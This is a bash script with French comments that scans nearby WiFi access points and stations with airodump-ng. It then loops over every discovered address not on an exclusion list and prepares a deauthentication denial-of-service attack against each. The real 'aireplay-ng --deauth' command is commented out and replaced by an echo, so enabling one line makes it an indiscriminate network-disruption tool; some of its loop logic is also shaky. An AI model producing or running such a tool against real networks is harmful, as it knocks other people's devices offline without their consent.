#!/bin/bash

# --- CONFIGURATIONS ---
INTERFACE="wlan0"
PACKETS_TO_SEND=3         # Par défaut (modifiable en argument)
LOGDIR="./logs"
EXCLUSIONS_FILE="./exclusions.txt"
IEEE_FILE="./standard-oui.ieee.txt"

# Création du répertoire logs si absent
mkdir -p "$LOGDIR"

# Lecture argument pour nombre paquets (optionnel)
if [[ $1 =~ ^[0-9]+$ ]]; then
  PACKETS_TO_SEND=$1
fi

# Fonction pour vérifier que la carte réseau existe
function check_interface() {
  ip link show "$INTERFACE" &>/dev/null
  if [[ $? -ne 0 ]]; then
    echo "Erreur : interface $INTERFACE introuvable"
    exit 1
  fi
}

# Fonction lire exclusions (MAC/BSSID) dans tableau
declare -A EXCLUDE_ADDRESSES
function load_exclusions() {
  if [[ ! -f "$EXCLUSIONS_FILE" ]]; then
    echo "Fichier d'exclusions non trouvé : $EXCLUSIONS_FILE"
    exit 1
  fi
  while read -r line; do
    # Enlever commentaires et blancs
    addr=$(echo "$line" | awk '{print $1}')
    if [[ "$addr" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
      EXCLUDE_ADDRESSES["$addr"]=1
    fi
  done < "$EXCLUSIONS_FILE"
}

# Fonction lookup fabricant IEEE
function lookup_manufacturer() {
  local mac="$1"
  local prefix=${mac^^}  # uppercase
  prefix=${prefix//:/}
  prefix=${prefix:0:6}
  # Recherche dans fichier IEEE
  grep -i "^$prefix" "$IEEE_FILE" | head -n1 | cut -f2- -d ' '
}

# Fonction scan WiFi (exemple basique)
function scan_wifi() {
  echo "Scan WiFi en cours..."
  # Exemple : airodump-ng en mode lecture pour récupérer BSSID + STATION + ESSID
  # Ici tu peux adapter en fonction de ton outil préféré
  # On récupère la liste des BSSIDs + stations
  airodump-ng --write-interval 1 --output-format csv -w "$LOGDIR/scan" "$INTERFACE" & sleep 10; kill $!
  
  # Traitement exemple: liste BSSID exclues filtrées etc.
  echo "Liste des points d'accès et stations :"
  awk -F',' 'NR>5 && $1 ~ /[0-9a-fA-F:]{17}/ {print $1, $14}' "$LOGDIR/scan-01.csv"
}

# Fonction attaque DOS simulée (envoi paquets)
function attack_dos() {
  echo "Lancement attaque simulée (envoi $PACKETS_TO_SEND paquets)..."
  # Exemple avec aireplay-ng (adapté selon tes outils)
  # On exclut les MAC/BSSID listés
  for target in $(airodump-ng --write-interval 1 --output-format csv -w "$LOGDIR/targets" "$INTERFACE" & sleep 5; kill $!; awk -F',' 'NR>5 && $1 ~ /[0-9a-fA-F:]{17}/ {print $1}' "$LOGDIR/targets-01.csv"); do
    if [[ -z "${EXCLUDE_ADDRESSES[$target]}" ]]; then
      echo "Attaque sur $target"
      # Exemple envoi paquet
      # aireplay-ng --deauth $PACKETS_TO_SEND -a "$target" "$INTERFACE" 
      # Pour test on simule avec echo
      echo "Envoi $PACKETS_TO_SEND paquets de déauth à $target"
    else
      echo "Exclu $target"
    fi
  done
}

# --- MAIN ---

echo "Début script WiFi avec interface $INTERFACE"

check_interface
load_exclusions

scan_wifi

attack_dos

echo "Lookup fabricants des adresses scannées :"
# Exemple simple : on liste MAC exclues avec lookup
for mac in "${!EXCLUDE_ADDRESSES[@]}"; do
  manu=$(lookup_manufacturer "$mac")
  echo "$mac : $manu"
done

echo "Logs dans $LOGDIR"

exit 0

